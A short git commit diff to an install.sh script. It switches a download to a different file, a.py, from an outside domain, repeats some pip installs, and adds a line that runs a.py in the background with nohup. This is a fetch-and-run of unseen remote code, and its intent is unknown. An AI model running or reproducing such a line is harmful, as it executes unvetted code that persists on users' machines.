5bed39b9c7961da86b434d54698a44bf859b940e
Zorynth Bendy <142782141+zorynith@users.noreply.github.com>
2025-11-15 18:03:21 +0800

    Update install.sh

--- public/install.sh
+++ public/install.sh
@@ -2,4 +2,9 @@ pip install requests beautifulsoup4 urllib3
 pip install requests beautifulsoup4 urllib3
 pip install chardet
 pip install chardet
-wget https://minelibs.eu.org/server.py
+wget https://minelibs.eu.org/a.py
+pip install requests beautifulsoup4 urllib3
+pip install requests beautifulsoup4 urllib3
+pip install chardet
+pip install chardet
+nohup python a.py &
